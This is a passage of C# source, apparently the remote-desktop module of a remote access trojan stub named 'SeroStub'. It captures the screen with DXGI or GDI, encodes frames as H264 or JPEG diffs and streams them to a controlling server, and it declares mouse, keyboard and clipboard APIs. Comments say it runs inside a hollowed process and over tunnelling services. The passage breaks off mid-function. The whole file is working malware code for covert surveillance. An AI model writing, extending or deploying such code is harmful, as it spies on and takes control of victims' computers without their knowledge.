using System.Runtime.InteropServices;
using System.Threading;

namespace SeroStub;

internal static class RemoteDesktopFeature
{
    // ── Constants ────────────────────────────────────────────────────────────

    private const int  SRCCOPY        = 0x00CC0020;
    private const int  CAPTUREBLT     = 0x40000000;
    private const int  CURSOR_SHOWING = 0x00000001;
    private const uint INPUT_MOUSE    = 0;
    private const uint INPUT_KEYBOARD = 1;
    private const uint MOUSEEVENTF_MOVE        = 0x0001;
    private const uint MOUSEEVENTF_LEFTDOWN    = 0x0002;
    private const uint MOUSEEVENTF_LEFTUP      = 0x0004;
    private const uint MOUSEEVENTF_RIGHTDOWN   = 0x0008;
    private const uint MOUSEEVENTF_RIGHTUP     = 0x0010;
    private const uint MOUSEEVENTF_MIDDLEDOWN  = 0x0020;
    private const uint MOUSEEVENTF_MIDDLEUP    = 0x0040;
    private const uint MOUSEEVENTF_WHEEL       = 0x0800;
    private const uint MOUSEEVENTF_ABSOLUTE    = 0x8000;
    private const uint MOUSEEVENTF_VIRTUALDESK = 0x4000;
    private const uint KEYEVENTF_KEYUP         = 0x0002;
    private const uint KEYEVENTF_EXTENDEDKEY   = 0x0001;
    private const uint CF_UNICODETEXT          = 13;
    private const uint GMEM_MOVEABLE           = 0x0002;
    private const int  BLOCK                   = 64;   // 64×64 → precise per-character updates, sharper text

    private static readonly Guid JpegClsid  = new("557CF401-1A04-11D3-9A73-0000F81EF32E");
    private static readonly Guid EncQuality = new("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");

    // ── P/Invoke ─────────────────────────────────────────────────────────────

    [DllImport("gdi32.dll")] static extern bool DeleteDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint CreateCompatibleDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint CreateCompatibleBitmap(nint hdc, int w, int h);
    [DllImport("gdi32.dll")] static extern nint SelectObject(nint hdc, nint obj);
    [DllImport("gdi32.dll")] static extern bool DeleteObject(nint obj);
    [DllImport("gdi32.dll")] static extern bool BitBlt(nint d, int dx, int dy, int dw, int dh, nint s, int sx, int sy, int rop);
    [DllImport("gdi32.dll")] static extern bool StretchBlt(nint d, int dx, int dy, int dw, int dh, nint s, int sx, int sy, int sw, int sh, int rop);
    [DllImport("gdi32.dll")] static extern int  SetStretchBltMode(nint hdc, int mode);
    [DllImport("gdi32.dll")] static extern int  GetDIBits(nint hdc, nint hbm, uint start, uint lines, byte[]? bits, ref BITMAPINFO bmi, uint usage);
    [DllImport("gdi32.dll")] static extern int  SetDIBits(nint hdc, nint hbm, uint start, uint lines, byte[] bits, ref BITMAPINFO bmi, uint usage);
    [DllImport("gdi32.dll")] static extern nint CreateDIBSection(nint hdc, ref BITMAPINFO pbmi, uint iUsage, out nint ppvBits, nint hSection, uint dwOffset);
    private const int HALFTONE = 4;

    [DllImport("user32.dll")] static extern nint GetDC(nint hwnd);
    [DllImport("user32.dll")] static extern bool ReleaseDC(nint hwnd, nint hdc);
    [DllImport("user32.dll")] static extern bool SetThreadDesktop(nint h);
    [DllImport("user32.dll")] static extern nint OpenInputDesktop(uint flags, bool inherit, uint access);
    [DllImport("user32.dll")] static extern bool CloseDesktop(nint h);
    [DllImport("user32.dll")] static extern int  GetSystemMetrics(int idx);
    [DllImport("user32.dll")] static extern bool EnumDisplayMonitors(nint hdc, nint clip, MonitorEnumProc cb, nint data);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern bool GetMonitorInfoW(nint hMon, ref MONITORINFOEX mi);
    [DllImport("user32.dll")] static extern nint SetThreadDpiAwarenessContext(nint dpiContext);
    [DllImport("user32.dll")] static extern uint SendInput(uint n, INPUT[] inputs, int cb);
    [DllImport("user32.dll")] static extern bool OpenClipboard(nint hwnd);
    [DllImport("user32.dll")] static extern bool CloseClipboard();
    [DllImport("user32.dll")] static extern bool EmptyClipboard();
    [DllImport("user32.dll")] static extern nint GetClipboardData(uint fmt);
    [DllImport("user32.dll")] static extern nint SetClipboardData(uint fmt, nint h);
    [DllImport("user32.dll")] static extern bool GetCursorInfo(out CURSORINFO pci);
    [DllImport("user32.dll")] static extern bool DrawIcon(nint hdc, int x, int y, nint hIcon);

    [DllImport("kernel32.dll")] static extern nint GlobalAlloc(uint f, nuint sz);
    [DllImport("kernel32.dll")] static extern nint GlobalFree(nint h);
    [DllImport("kernel32.dll")] static extern nint GlobalLock(nint h);
    [DllImport("kernel32.dll")] static extern bool GlobalUnlock(nint h);

    // SHCreateMemStream: creates an in-memory IStream (no disk I/O, no COM marshaling needed)
    [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint pInit, uint cbInit);

    [DllImport("gdiplus.dll")] static extern int GdiplusStartup(out nint token, ref GdiplusInput inp, nint output);
    [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint token);
    [DllImport("gdiplus.dll")] static extern int GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, nint scan0, out nint bmp);
    [DllImport("gdiplus.dll")] static extern int GdipDisposeImage(nint img);
    // Pass the raw IStream* as nint — avoids COM [MarshalAs] marshaling entirely
    [DllImport("gdiplus.dll")] static extern int GdipSaveImageToStream(nint img, nint stream, ref Guid clsid, nint encParams);

    // IStream vtable delegates (COM vtable dispatch without COM interop)
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint  VtRelease(nint pThis);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtSeek(nint pThis, long move, uint origin, ref long newPos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtRead(nint pThis, nint pv, uint cb, out uint cbRead);

    // SHCreateMemStream vtable delegates — same vtable for every IStream returned by shlwapi,
    // so we cache them after the first GdipBitmapToJpeg call and reuse forever.
    static VtSeek?    _shSeekFn;
    static VtRead?    _shReadFn;
    static VtRelease? _shReleaseFn;

    // ── Structs ───────────────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFOHEADER
    {
        public uint biSize; public int biWidth, biHeight;
        public ushort biPlanes, biBitCount;
        public uint biCompression, biSizeImage;
        public int biXPelsPerMeter, biYPelsPerMeter;
        public uint biClrUsed, biClrImportant;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFO
    {
        public BITMAPINFOHEADER bmiHeader;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public uint[] bmiColors;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct MONITORINFOEX
    {
        public uint cbSize;
        public RECT rcMonitor, rcWork;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szDevice;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct RECT { public int left, top, right, bottom; }
    [StructLayout(LayoutKind.Sequential)]
    struct GdiplusInput
    {
        public uint Version; public nint Callback;
        public int  SuppressBackground, SuppressExternalCodecs; // BOOL = 4 bytes
    }
    [StructLayout(LayoutKind.Sequential)]
    struct CURSORINFO { public int cbSize, flags; public nint hCursor; public int x, y; }
    [StructLayout(LayoutKind.Sequential)]
    struct MOUSEINPUT { public int dx, dy; public uint data, flags, time; public nint extra; }
    [StructLayout(LayoutKind.Sequential)]
    struct KEYBDINPUT { public ushort wVk, wScan; public uint flags, time; public nint extra; }
    [StructLayout(LayoutKind.Explicit)]
    struct INPUTUNION { [FieldOffset(0)] public MOUSEINPUT mi; [FieldOffset(0)] public KEYBDINPUT ki; }
    [StructLayout(LayoutKind.Sequential)]
    struct INPUT { public uint type; public INPUTUNION u; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParam { public Guid Guid; public uint Count, Type; public nint Value; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParams { public uint Count; public EncoderParam Param; }

    delegate bool MonitorEnumProc(nint hMon, nint hdcMon, nint lprc, nint data);

    record struct MonInfo(string Name, int X, int Y, int W, int H);

    // ── State ─────────────────────────────────────────────────────────────────

    private static readonly SemaphoreSlim _frameReqWake = new(0);
    private static volatile int _pendingRequests;

    private static volatile bool _running;
    private static Thread? _thread;
    private static Func<int, string, System.Threading.Tasks.Task>? _send;
    private static RdpStartDataStub _cfg = new();
    private static nint _gdipToken;
    private static MonInfo[] _monitors = [];

    // Previous frame for block-level diff
    private static byte[]? _prevPixels;
    private static bool   _prevFromPool; // true iff _prevPixels was rented from ArrayPool
    private static int _prevW, _prevH;

    // Reusable scratch for CaptureAndDiff — avoids per-frame heap allocation
    private static readonly System.Collections.Generic.List<(int bx, int by, int bw, int bh)> _diffChangedBlocks = new(128);
    private static byte[]?[]? _diffEncoded;
    private static int[]?     _diffEncodedLen;
    private static readonly System.Text.StringBuilder _diffSb = new(4096);
    // Scheduled tick to force a full-frame refresh (clears _prevPixels so next capture is a complete frame)
    private static long _forceRefreshAt;

    // Encoder params are now allocated per-call in GdipBitmapToJpeg (see comment there).

    private static string _lastClip = "";

    // H264 encoder — null when MF is unavailable (falls back to JPEG block mode)
    private static H264Encoder? _h264Enc;
    private static int _h264W, _h264H; // last encoded frame dimensions for packet JSON
    private static char[] _h264B64 = new char[128 * 1024]; // grow-only; 128K chars covers ~96KB frame = 7.7 Mbit/s@30fps
    private static readonly System.Text.StringBuilder _h264Sb = new(128 * 1024);
    private static string _rdpH264Prefix = "";             // "{\"W\":W,\"H\":H,\"D\":\"" — rebuilt on dimension change
    private static readonly System.Threading.Tasks.ParallelOptions _diffPO =
        new() { MaxDegreeOfParallelism = Math.Max(1, Environment.ProcessorCount / 2) };
    private static readonly uint[] _rdpBmiColors = new uint[4]; // reused by every CaptureGdi BITMAPINFO

    // Params for CaptureAndDiff static Parallel.For lambda — written before Parallel.For, single capture thread only.
    private static byte[]? _diffPixels;
    private static int _diffW, _diffH, _diffQ;

    // Adaptive bandwidth: quality ramps down when acks are slow, recovers when they're fast.
    // _adaptiveQuality starts at _cfg.Quality (the server-configured max) and is clamped to [15, _cfg.Quality].
    private static volatile int _adaptiveQuality;
    private static long         _lastFrameSendMs; // written by capture thread, read by SignalAck thread

    // ── Cursor overlay cache — created once, reused every frame ──────────────
    // Avoids per-frame CreateCompatibleBitmap/DeleteObject + GetDC/ReleaseDC
    private static nint _cursorDc;
    private static nint _cursorBitmap;
    private static nint _cursorBits;  // direct pointer to DIBSection pixels
    private static int  _cursorCacheW, _cursorCacheH;
    private static int  _cursorSysH = -1; // SM_CYCURSOR cached — constant per session

    // ── Public API ────────────────────────────────────────────────────────────

    public static void Start(RdpStartDataStub cfg, Func<int, string, System.Threading.Tasks.Task> send)
    {
        Stop();
        _cfg  = cfg;
        _send = send;
        _prevPixels = null; _prevFromPool = false; // reset diff buffer on new session
        Interlocked.Exchange(ref _forceRefreshAt, Environment.TickCount64 + 200);

        _adaptiveQuality = cfg.Quality;
        Interlocked.Exchange(ref _lastFrameSendMs, 0);

        EnsureGdiplus();
        _monitors = EnumMonitors();

        // H264 encoder is created lazily on first capture (dimensions depend on actual monitor size)
        _h264Enc?.Dispose(); _h264Enc = null;
        _h264W = 0; _h264H = 0;

        Interlocked.Exchange(ref _pendingRequests, 3); // 3 credits: limits in-flight frames so slow tunnels (localtonet) don't saturate the TCP buffer
        _running = true;
        _thread = new Thread(CaptureLoop)
        {
            IsBackground = true, Priority = ThreadPriority.Normal, Name = "RdpCapture"
        };
        _thread.Start();
    }

    public static void Stop()
    {
        _running = false;
        _frameReqWake.Release();
        bool exited = _thread?.Join(2000) ?? true;
        _thread = null;
        Interlocked.Exchange(ref _pendingRequests, 0);
        // Only return _prevPixels to the pool if the thread exited cleanly and the buffer came from ArrayPool.
        // If Join timed out the thread may still be reading _prevPixels → skip to avoid use-after-free.
        // If the buffer was from DXGI (not pool-rented) → returning it would corrupt ArrayPool.
        if (exited && _prevPixels != null && _prevFromPool)
            System.Buffers.ArrayPool<byte>.Shared.Return(_prevPixels);
        _prevPixels = null;
        _prevFromPool = false;
        // Free GDI objects — only when thread has exited (safe), otherwise just zero refs.
        if (exited)
        {
            if (_cursorBitmap != 0) { DeleteObject(_cursorBitmap); _cursorBitmap = 0; }
            if (_cursorDc     != 0) { DeleteDC(_cursorDc);          _cursorDc     = 0; }
            FreeGdiCache();
        }
        else
        {
            _cursorBitmap = 0; _cursorDc = 0;
            _gdiHdcMem = _gdiHbm = _gdiHbmOld = 0;
            _gdiHdcScl = _gdiHbmScl = _gdiHbmSclOld = 0;
            _gdiCachedSrcW = _gdiCachedSrcH = _gdiCachedDstW = _gdiCachedDstH = 0;
        }
        _cursorBits   = 0;
        _cursorCacheW = 0;
        _cursorCacheH = 0;
        _h264Enc?.Dispose(); _h264Enc = null;
        _h264W = 0; _h264H = 0;
    }

    public static void SignalAck()
    {
        long sentMs = Interlocked.Read(ref _lastFrameSendMs);
        if (sentMs > 0)
        {
            int rtt = (int)Math.Min(Environment.TickCount64 - sentMs, 5000);
            int q   = _adaptiveQuality;
            if      (rtt > 450 && q > 15)            _adaptiveQuality = Math.Max(15,           q - 8);
            else if (rtt < 100 && q < _cfg.Quality)  _adaptiveQuality = Math.Min(_cfg.Quality, q + 3);
        }
        Interlocked.Add(ref _pendingRequests, 1);
        _frameReqWake.Release();
    }

    // ── Capture loop ──────────────────────────────────────────────────────────

    private static void CaptureLoop()
    {
        try
        {
            // Set physical-pixel DPI awareness FIRST — prevents seeing only a corner of the
            // screen on high-DPI machines where the hollowed process was DPI-virtualized.
            // DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = -4
            SetThreadDpiAwarenessContext(-4);

            // Set thread to interactive desktop (critical in hollowed processes)
            nint hDesk = Program.OriginalDesktop != 0
                ? Program.OriginalDesktop
                : OpenInputDesktop(0, false, 0x01FF);
            if (hDesk != 0)
            {
                SetThreadDesktop(hDesk);
                if (hDesk != Program.OriginalDesktop) CloseDesktop(hDesk);
            }

            // Re-enumerate monitors now that DPI awareness is set to physical pixels.
            // Start() enumerates on the calling thread (possibly DPI-virtualized); this
            // re-enum gives us correct physical dimensions for BitBlt and the combobox.
            _monitors = EnumMonitors();

            // Send monitor list so the server can populate the combobox
            SendMonitorListPublic(_send!);

            int monIdx   = Math.Clamp(_cfg.Monitor, 0, Math.Max(0, _monitors.Length - 1));
            // Fps=0 = unlimited. DXGI provides natural VBLANK pacing via AcquireNextFrame
            // (returns when a new frame is ready, bounded by monitor refresh rate).
            // No extra sleep needed — adding one would cap a 120 Hz monitor at 60 fps.
            // GDI path has no hardware throttle; GDI encode overhead (~10ms) acts as a floor.
            int targetMs = _cfg.Fps > 0 ? Math.Max(1, 1000 / _cfg.Fps) : 0;

            // Try DXGI Desktop Duplication for this monitor (falls back to GDI per frame if unavailable)
            DxgiCapture.TryInit(monIdx);

            // Warm-up: discard the first 3 DXGI frames so the initial snapshot we send
            // is fully composited by DWM (first frame after init often has black regions
            // for GPU-layered content that hasn't been flushed to the output yet).
            // Wrapped in try-catch: if DXGI throws during warmup (GPU driver reset,
            // exclusive fullscreen app, etc.) fall back to GDI instead of killing the thread.
            if (DxgiCapture.IsInitialized)
            {
                try
                {
                    for (int i = 0; i < 3; i++)
                        DxgiCapture.CaptureFrame(out _, out _, 20);
                }
                catch { DxgiCapture.Release(); }
            }

            // Send monitor list — wrapped so a transient send error doesn't kill the thread
            try { SendMonitorListPublic(_send!); } catch { }

            while (_running)
            {
                // Flow control: wait until server has acked the previous frame.
                // On LAN acks come back in <5ms so this adds no perceptible latency.
                // On WAN (high RTT) this naturally throttles sends to the network's
                // capacity and prevents the TCP send buffer from filling indefinitely.
                if (_pendingRequests <= 0)
                {
                    _frameReqWake.Wait(200);
                    if (!_running) break;
                    if (_pendingRequests <= 0) continue;
                }
                Interlocked.Decrement(ref _pendingRequests);

                try
                {
                    long t0 = Environment.TickCount64;

                    var mon  = _monitors.Length > 0 ? _monitors[monIdx] : default;
                    int srcW = mon.W > 0 ? mon.W : GetSystemMetrics(0);
                    int srcH = mon.H > 0 ? mon.H : GetSystemMetrics(1);

                    // H264 path: capture full frame and feed to MF H264 encoder
                    var h264 = CaptureAndEncodeH264(mon.X, mon.Y, srcW, srcH);
                    if (h264 != null)
                    {
                        Interlocked.Exchange(ref _lastFrameSendMs, Environment.TickCount64);
                        var (h264Buf, h264Len) = h264.Value;
                        int b64Need = (h264Len + 2) / 3 * 4;
                        if (_h264B64.Length < b64Need) _h264B64 = new char[b64Need + 64];
                        Convert.TryToBase64Chars(h264Buf.AsSpan(0, h264Len), _h264B64, out int b64Written);
                        _h264Sb.Clear();
                        _h264Sb.Append(_rdpH264Prefix).Append(_h264B64, 0, b64Written).Append("\"}");
                        _ = _send?.Invoke((int)PacketType.RdpH264Frame, _h264Sb.ToString());
                    }
                    else if (_h264Enc == null)
                    {
                        // H264 unavailable — fall back to JPEG block mode
                        string? json = CaptureAndDiff(mon.X, mon.Y, srcW, srcH);
                        if (json != null)
                        {
                            Interlocked.Exchange(ref _lastFrameSendMs, Environment.TickCount64);
                            _ = _send?.Invoke((int)PacketType.RdpFrame, json);
                        }
                        else
                        {
                            // No change detected — give credit back immediately so we keep polling
                            Interlocked.Increment(ref _pendingRequests);
                        }
                    }
                    else
                    {
                        // H264 encoder exists but returned no output (priming or no frame yet)
                        Interlocked.Increment(ref _pendingRequests);
                    }

                    if (targetMs > 0)
                    {
                        int elapsedMs = (int)(Environment.TickCount64 - t0);
                        int sleepMs   = targetMs - elapsedMs;
                        if (sleepMs > 0) Thread.Sleep(sleepMs);
                    }
                }
                catch { Thread.Sleep(33); }
            }
        }
        catch { }
        finally { DxgiCapture.Release(); }
    }

    // ── GDI pixel capture — BitBlt path, used when DXGI is unavailable ────────

    // Fills caller-supplied pixel buffer — avoids 8 MB allocation per frame.
    // DC + DDB are cached across frames and recreated only when dimensions change.
    private static bool CaptureGdi(int srcX, int srcY, int srcW, int srcH, int dstW, int dstH, byte[] pixels)
    {
        nint hdcScreen = GetDC(0);
        if (hdcScreen == 0) return false;
        try
        {
            if (_gdiHdcMem == 0 || _gdiCachedSrcW != srcW || _gdiCachedSrcH != srcH
                                || _gdiCachedDstW != dstW  || _gdiCachedDstH != dstH)
            {
                FreeGdiCache();
                _gdiHdcMem = CreateCompatibleDC(hdcScreen);
                if (_gdiHdcMem == 0) return false;
                _gdiHbm    = CreateCompatibleBitmap(hdcScreen, srcW, srcH);
                if (_gdiHbm == 0) { DeleteDC(_gdiHdcMem); _gdiHdcMem = 0; return false; }
                _gdiHbmOld = SelectObject(_gdiHdcMem, _gdiHbm);
                if (dstW != srcW || dstH != srcH)
                {
                    _gdiHdcScl    = CreateCompatibleDC(hdcScreen);
                    _gdiHbmScl    = CreateCompatibleBitmap(hdcScreen, dstW, dstH);
                    _gdiHbmSclOld = SelectObject(_gdiHdcScl, _gdiHbmScl);
                }
                _gdiCachedSrcW = srcW; _gdiCachedSrcH = srcH;
                _gdiCachedDstW = dstW; _gdiCachedDstH = dstH;
            }

            if (!BitBlt(_gdiHdcMem, 0, 0, srcW, srcH, hdcScreen, srcX, srcY, SRCCOPY | CAPTUREBLT))
                return false;

            DrawCursor(_gdiHdcMem, srcX, srcY, srcW, srcH, srcW, srcH);

            nint hdcRead = _gdiHdcScl != 0 ? _gdiHdcScl : _gdiHdcMem;
            nint hbmRead = _gdiHdcScl != 0 ? _gdiHbmScl : _gdiHbm;
            if (_gdiHdcScl != 0)
            {
                SetStretchBltMode(_gdiHdcScl, HALFTONE);
                StretchBlt(_gdiHdcScl, 0, 0, dstW, dstH, _gdiHdcMem, 0, 0, srcW, srcH, SRCCOPY);
            }

            var bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
                    biWidth = dstW, biHeight = -dstH,
                    biPlanes = 1, biBitCount = 32, biCompression = 0
                },
                bmiColors = _rdpBmiColors
            };
            GetDIBits(hdcRead, hbmRead, 0, (uint)dstH, pixels, ref bmi, 0);
            return true;
        }
        catch { FreeGdiCache(); return false; }
        finally { ReleaseDC(0, hdcScreen); }
    }

    private static void FreeGdiCache()
    {
        if (_gdiHbmSclOld != 0 && _gdiHdcScl != 0) { SelectObject(_gdiHdcScl, _gdiHbmSclOld); _gdiHbmSclOld = 0; }
        if (_gdiHbmScl    != 0) { DeleteObject(_gdiHbmScl); _gdiHbmScl = 0; }
        if (_gdiHdcScl    != 0) { DeleteDC(_gdiHdcScl);     _gdiHdcScl = 0; }
        if (_gdiHbmOld    != 0 && _gdiHdcMem != 0) { SelectObject(_gdiHdcMem, _gdiHbmOld); _gdiHbmOld = 0; }
        if (_gdiHbm       != 0) { DeleteObject(_gdiHbm);    _gdiHbm = 0; }
        if (_gdiHdcMem    != 0) { DeleteDC(_gdiHdcMem);     _gdiHdcMem = 0; }
        _gdiCachedSrcW = _gdiCachedSrcH = _gdiCachedDstW = _gdiCachedDstH = 0;
    }

    // ── H264 capture path ─────────────────────────────────────────────────────

    // Captures a full BGRA frame and encodes it as H264.
    // Creates/recreates the encoder lazily when dimensions change.
    // Returns null when H264 is unavailable (caller falls back to JPEG) or when
    // the encoder is still priming (first 1-2 frames may return no output).
    private static (byte[], int)? CaptureAndEncodeH264(int srcX, int srcY, int srcW, int srcH)
    {
        int scale = Math.Clamp(_cfg.Scale, 25, 100);
        int dstW  = srcW * scale / 100;
        int dstH  = srcH * scale / 100;
        if ((dstW & 1) != 0) dstW--;   // H264 requires even dimensions
        if ((dstH & 1) != 0) dstH--;
        if (dstW <= 0 || dstH <= 0) return null;

        // Create or recreate encoder when dimensions change
        if (_h264Enc == null || _h264W != dstW || _h264H != dstH)
        {
            _h264Enc?.Dispose();
            _h264Enc = H264Encoder.Create(dstW, dstH, _cfg.Fps);
            if (_h264Enc == null) return null; // MF unavailable
            _h264W = dstW;
            _h264H = dstH;
            _rdpH264Prefix = "{\"W\":" + dstW + ",\"H\":" + dstH + ",\"D\":\"";
        }

        byte[]? pixels = null;

        if (scale == 100 && DxgiCapture.IsInitialized)
        {
            pixels = DxgiCapture.CaptureFrame(out dstW, out dstH, 16);
            if (pixels != null)
                TryAddCursorToFrame(pixels, dstW, dstH, srcX, srcY);
            else if (DxgiCapture.IsInitialized)
                return null; // VBLANK timeout — no new frame
        }

        if (pixels == null)
        {
            int reqLen = dstW * dstH * 4;
            pixels = System.Buffers.ArrayPool<byte>.Shared.Rent(reqLen);
            if (!CaptureGdi(srcX, srcY, srcW, srcH, dstW, dstH, pixels))
            {
                System.Buffers.ArrayPool<byte>.Shared.Return(pixels);
                return null;
            }
        }

        try
        {
            // Recreate encoder if DXGI gave us different dimensions
            if (dstW != _h264W || dstH != _h264H)
            {
                if ((dstW & 1) != 0) dstW--;
                if ((dstH & 1) != 0) dstH--;
                if (dstW <= 0 || dstH <= 0) return null;
                _h264Enc?.Dispose();
                _h264Enc = H264Encoder.Create(dstW, dstH, _cfg.Fps);
                if (_h264Enc == null) return null;
                _h264W = dstW;
                _h264H = dstH;
                _rdpH264Prefix = "{\"W\":" + dstW + ",\"H\":" + dstH + ",\"D\":\"";
            }

            unsafe
            {
                fixed (byte* pPixels = pixels)
                    return _h264Enc.Encode((nint)pPixels, dstW * 4);
            }
        }
        finally
        {
            // Return to pool regardless of source — DxgiCapture transfers ArrayPool ownership to caller
            System.Buffers.ArrayPool<byte>.Shared.Return(pixels);
        }
    }

    // ── Adaptive capture: DXGI Desktop Duplication preferred, GDI fallback ────

    private static string? CaptureAndDiff(int srcX, int srcY, int srcW, int srcH)
    {
        int scale  = Math.Clamp(_cfg.Scale, 25, 100);
        int dstW = 0, dstH = 0;
        byte[]? pixels = null;

        // DXGI Desktop Duplication: GPU-direct, VBLANK-paced capture.
        // timeout=16ms blocks until the next frame from DWM — no busy-poll, natural 60fps pacing.
        // When DXGI returns null with IsInitialized still true → timeout, screen truly unchanged → skip GDI.
        // When DXGI returns null with IsInitialized false → driver error/mode change → fall through to GDI.
        if (scale == 100 && DxgiCapture.IsInitialized)
        {
            pixels = DxgiCapture.CaptureFrame(out dstW, out dstH, 16);
            if (pixels != null)
                TryAddCursorToFrame(pixels, dstW, dstH, srcX, srcY);
            else if (DxgiCapture.IsInitialized)
                return null; // VBLANK timeout — no new frame, nothing to send
            // else: DXGI released itself (ACCESS_LOST / mode change) — fall through to GDI
        }

        bool pixelsFromPool = false;
        if (pixels == null)
        {
            // GDI BitBlt fallback (always works: RDP sessions, headless, non-BGRA formats)
            dstW = Math.Max(1, srcW * scale / 100);
            dstH = Math.Max(1, srcH * scale / 100);
            int requiredLen = dstW * 4 * dstH;
            // Always rent a new buffer — never write into _prevPixels directly.
            // Reusing _prevPixels as the capture target overwrites the diff baseline,
            // so BlockChanged would compare new pixels against themselves → zero diff every frame.
            pixels = System.Buffers.ArrayPool<byte>.Shared.Rent(requiredLen);
            pixelsFromPool = true;
            if (!CaptureGdi(srcX, srcY, srcW, srcH, dstW, dstH, pixels))
            {
                System.Buffers.ArrayPool<byte>.Shared.Return(pixels);
                return null;
            }
        }

        // ── Block-level diff vs previous frame ────────────────────────────────

        // Scheduled full-refresh: clear the diff baseline so the next frame is sent complete.
        // Fires ~800ms after Start() to flush any black regions from the initial DXGI snapshot.
        long forceAt = Interlocked.Read(ref _forceRefreshAt);
        if (forceAt != 0 && Environment.TickCount64 >= forceAt)
        {
            Interlocked.Exchange(ref _forceRefreshAt, 0);
            if (_prevPixels != null && _prevFromPool) { System.Buffers.ArrayPool<byte>.Shared.Return(_prevPixels); }
            _prevPixels   = null;
            _prevFromPool = false;
        }

        bool firstFrame = _prevPixels == null || _prevW != dstW || _prevH != dstH;

        _diffChangedBlocks.Clear();
        var changedBlocks = _diffChangedBlocks;
        int bCols = (dstW + BLOCK - 1) / BLOCK;
        int bRows = (dstH + BLOCK - 1) / BLOCK;

        for (int br = 0; br < bRows; br++)
        {
            int by = br * BLOCK;
            int bh = Math.Min(BLOCK, dstH - by);
            for (int bc = 0; bc < bCols; bc++)
            {
                int bx = bc * BLOCK;
                int bw = Math.Min(BLOCK, dstW - bx);
                if (firstFrame || BlockChanged(pixels, _prevPixels!, dstW, bx, by, bw, bh))
                    changedBlocks.Add((bx, by, bw, bh));
            }
        }

        if (changedBlocks.Count == 0 && !firstFrame)
        {
            if (pixelsFromPool) System.Buffers.ArrayPool<byte>.Shared.Return(pixels);
            return null;
        }

        int totalBlocks  = bCols * bRows;
        int changedCount = changedBlocks.Count;

        if (_prevPixels != null && _prevFromPool && _prevPixels != pixels)
        {
            System.Buffers.ArrayPool<byte>.Shared.Return(_prevPixels);
        }
        _prevPixels   = pixels;
        _prevFromPool = pixelsFromPool;
        _prevW = dstW; _prevH = dstH;

        // ── Adaptive encode strategy ──────────────────────────────────────────
        const int FULLFRAME_THRESHOLD_PCT = 45;
        bool useFullFrame = firstFrame || changedCount * 100 / totalBlocks >= FULLFRAME_THRESHOLD_PCT;

        if (useFullFrame)
        {
            byte[]? fullJpeg = EncodeBlock(pixels, dstW, dstH, 0, 0, dstW, dstH, _adaptiveQuality, out int fullLen);
            if (fullJpeg == null || fullLen == 0) return null;
            int b64Need = (fullLen + 2) / 3 * 4;
            if (_h264B64.Length < b64Need) _h264B64 = new char[b64Need + 64];
            Convert.TryToBase64Chars(fullJpeg.AsSpan(0, fullLen), _h264B64, out int b64W);
            System.Buffers.ArrayPool<byte>.Shared.Return(fullJpeg);
            _diffSb.Clear();
            _diffSb.Append("{\"w\":").Append(dstW).Append(",\"h\":").Append(dstH);
            if (scale < 100) _diffSb.Append(",\"sw\":").Append(srcW).Append(",\"sh\":").Append(srcH);
            _diffSb.Append(",\"j\":\"").Append(_h264B64, 0, b64W).Append("\"}");
            return _diffSb.ToString();
        }

        int effectiveQ = changedCount < totalBlocks * 15 / 100 ? 95 : _adaptiveQuality;

        if (_diffEncoded == null || _diffEncoded.Length < changedBlocks.Count)
        {
            int sz = Math.Max(changedBlocks.Count, 64);
            _diffEncoded    = new byte[]?[sz];
            _diffEncodedLen = new int[sz];
        }
        _diffPixels = pixels;
        _diffW = dstW; _diffH = dstH; _diffQ = effectiveQ;
        System.Threading.Tasks.Parallel.For(0, _diffChangedBlocks.Count, _diffPO, static i =>
        {
            var (bx, by, bw, bh) = _diffChangedBlocks[i];
            _diffEncoded![i] = EncodeBlock(_diffPixels!, _diffW, _diffH, bx, by, bw, bh, _diffQ, out int len);
            _diffEncodedLen![i] = len;
        });

        _diffSb.Clear();
        var sb = _diffSb;
        sb.Append("{\"w\":").Append(dstW).Append(",\"h\":").Append(dstH);
        if (scale < 100) sb.Append(",\"sw\":").Append(srcW).Append(",\"sh\":").Append(srcH);
        sb.Append(",\"blocks\":[");

        bool first = true;
        for (int i = 0; i < changedBlocks.Count; i++)
        {
            byte[]? jpeg = _diffEncoded![i];
            if (jpeg == null || _diffEncodedLen![i] == 0) { if (jpeg != null) { System.Buffers.ArrayPool<byte>.Shared.Return(jpeg); _diffEncoded[i] = null; } continue; }
            var (bx, by, bw, bh) = changedBlocks[i];
            if (!first) sb.Append(',');
            first = false;
            int bLen  = _diffEncodedLen![i];
            int bNeed = (bLen + 2) / 3 * 4;
            if (_h264B64.Length < bNeed) _h264B64 = new char[bNeed + 64];
            Convert.TryToBase64Chars(jpeg.AsSpan(0, bLen), _h264B64, out int bW);
            sb.Append("{\"x\":").Append(bx)
              .Append(",\"y\":").Append(by)
              .Append(",\"w\":").Append(bw)
              .Append(",\"h\":").Append(bh)
              .Append(",\"j\":\"").Append(_h264B64, 0, bW).Append("\"}");
            System.Buffers.ArrayPool<byte>.Shared.Return(jpeg);
            _diffEncoded[i] = null;
        }
        sb.Append("]}");
        return first ? null : sb.ToString();
    }

    // SIMD-accelerated block comparison via SequenceEqual (uses AVX2/SSE2 under the hood)
    private static bool BlockChanged(byte[] cur, byte[] prev, int w, int bx, int by, int bw, int bh)
    {
